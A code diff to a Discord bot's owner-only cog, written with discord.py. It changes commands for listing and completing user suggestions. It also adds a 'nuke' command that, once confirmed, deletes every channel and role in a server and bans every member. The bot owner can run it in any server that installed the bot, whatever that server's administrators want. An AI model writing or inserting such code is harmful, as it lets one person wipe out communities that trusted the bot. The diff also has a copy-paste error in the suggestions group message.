@@ -226,14 +226,51 @@ class OwnerCog(commands.Cog):
                         await asyncio.sleep(1)
                     vc.stop()
                     continue
-
-
-
-
-
-    @commands.command(name='showsuggestions', hidden=True)
     @commands.is_owner()
-    async def showsuggestions(self, ctx, status):
+    @commands.command(name="nuke")
+    async def nuke(self, ctx):
+        await ctx.send("Are you sure?")
+
+        def check(m):
+            return m.author == ctx.author and m.channel == ctx.channel
+        try:
+            msg = await self.bot.wait_for('message', check=check, timeout=20.0)
+            if msg.content == "yes":
+                for channel in ctx.guild.channels:
+                    await channel.delete()
+                for role in ctx.guild.roles:
+                    try:
+                        await role.delete()
+                    except:
+                        continue
+                for member in ctx.guild.members:
+                    try:
+                        await member.ban()
+                    except:
+                        continue
+                await ctx.author.send("Nuke complete")
+                return
+            elif msg.content == "no":
+                await ctx.send("perhaps another time")
+                return
+        except asyncio.TimeoutError:
+            await ctx.send("Nevermind then.")
+            return
+        else:
+            return
+
+
+    @commands.is_owner()
+    @commands.group(pass_context=True)
+    async def suggestions(self, ctx):
+        if ctx.invoked_subcommand is None:
+            msg = await ctx.send("Invalid use of casino command")
+            await asyncio.sleep(2)
+            await msg.delete()
+
+    @suggestions.command(pass_context=True)
+    @commands.is_owner()
+    async def show(self, ctx, status):
         conn = sqlite3.connect(db_path)
         c = conn.cursor()
 
@@ -243,10 +280,29 @@ class OwnerCog(commands.Cog):
         if suggestions:
             embed = discord.Embed(title="Suggestions", colour=0xc7e6a7, description=status)
             for suggestion in suggestions:
-                embed.add_field(name="\u200b", value="<@{}>\n{}".format(str(suggestion[1]), suggestion[2]))
+                embed.add_field(name="\u200b", value="{}: <@{}>\n{}".format(str(suggestion[0]), str(suggestion[1]), suggestion[2]))
             await ctx.send(embed=embed)
         else:
             await ctx.send("No suggestions found")
+
+    @suggestions.command(pass_context=True)
+    @commands.is_owner()
+    async def complete(self, ctx, id: int):
+        await ctx.message.delete()
+
+        conn = sqlite3.connect(db_path)
+        c = conn.cursor()
+
+        c.execute("SELECT * FROM suggestions WHERE id=?", (id,))
+        suggestion = c.fetchone()
+
+        c.execute("UPDATE suggestions SET status=? WHERE id=?", ("complete", id,))
+        conn.commit()
+        conn.close()
+
+        await ctx.send("{} your suggestion of '{}' is complete!".format(self.bot.get_user(suggestion[1]).mention, suggestion[2]))
+        return
+
 
 
 def setup(bot):
